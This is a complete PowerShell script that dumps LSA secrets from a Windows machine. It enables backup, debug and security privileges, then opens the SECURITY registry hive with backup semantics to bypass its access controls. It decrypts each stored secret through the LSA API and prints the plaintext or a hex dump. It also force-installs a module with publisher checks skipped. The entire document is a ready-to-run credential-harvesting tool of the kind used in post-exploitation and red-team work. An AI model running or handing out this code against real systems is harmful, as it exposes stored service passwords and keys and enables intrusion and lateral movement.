<#
.SYNOPSIS
    Dump LSA Secrets using NtObjectManager.
    
.DESCRIPTION
    This script enumerates and decrypts LSA secrets from the registry. 
    It requires SYSTEM integrity or High Integrity with SeBackupPrivilege.
    It leverages NtObjectManager for native API access and LSA interaction.

.USAGE
    PS C:\> . .\Dump-LSASecrets.ps1
#>

# 1. Ensure NtObjectManager is available
if (-not (Get-Module -Name NtObjectManager)) {
    Write-Host "[*] NtObjectManager not found. Attempting to import/install..." -ForegroundColor Yellow
    Install-Module NtObjectManager -Scope CurrentUser -Force -SkipPublisherCheck -ErrorAction SilentlyContinue
    Import-Module NtObjectManager
}

# 2. Enable Required Privileges
try {
    $Token = Get-NtToken -Primary
    $null = Set-NtTokenPrivilege -Token $Token -Privileges SeBackupPrivilege, SeDebugPrivilege, SeSecurityPrivilege -ErrorAction SilentlyContinue
} catch {}

# 3. Main Logic
try {
    Write-Host "[*] Enumerating LSA Secrets via Registry..." -ForegroundColor Cyan
    $regPath = "\Registry\Machine\SECURITY\Policy\Secrets"
    
    # Open key with BackupRestore options to bypass DACLs
    $key = Get-NtKey -Path $regPath -Access EnumerateSubKeys -Options BackupRestore -ErrorAction Stop
    $subkeys = $key.QueryKeys()
    
    $secretsFound = @()
    foreach ($k in $subkeys) {
        $name = if ($k.Name) { $k.Name } else { $k.ToString() }
        if ([string]::IsNullOrWhiteSpace($name)) { continue }
        # Filter out common noise if desired, or dump all
        if ($name -notlike "G$*" -and $name -notlike "NL$*") { 
            $secretsFound += $name 
        }
    }
    $key.Close()

    Write-Host "[+] Found $( $secretsFound.Count ) secrets. Decrypting via LSA API..." -ForegroundColor Green
    
    # Open LSA Policy
    $policy = Get-LsaPolicy -Access ViewLocalInformation, GetPrivateInformation
    
    foreach ($sName in $secretsFound) {
        Write-Host "`n[*] Secret: $sName" -ForegroundColor Cyan
        try {
            $secretObj = Get-LsaSecret -Policy $policy -Name $sName -ErrorAction Stop
            $val = $secretObj.Query()
            
            if ($val.CurrentValue) {
                # Check if binary or string
                $isBinary = $false
                foreach ($b in $val.CurrentValue) {
                    if ($b -eq 0 -or ($b -lt 32 -and $b -ne 9 -and $b -ne 10 -and $b -ne 13)) { 
                        $isBinary = $true; break 
                    }
                }

                if ($isBinary) {
                    Write-Host "    Type: Binary Data" -ForegroundColor Gray
                    $val.CurrentValue | Out-HexDump
                } else {
                    $strVal = [System.Text.Encoding]::Unicode.GetString($val.CurrentValue)
                    Write-Host "    Value: $strVal" -ForegroundColor White
                }
            } else {
                Write-Host "    [Value is Empty]" -ForegroundColor Gray
            }
        } catch {
            Write-Host "    [Access Denied or Not Decryptable]" -ForegroundColor Red
        }
    }
} catch {
    Write-Error "Failed to dump LSA secrets: $_"
} finally {
    if ($policy) { $policy.Dispose() }
}
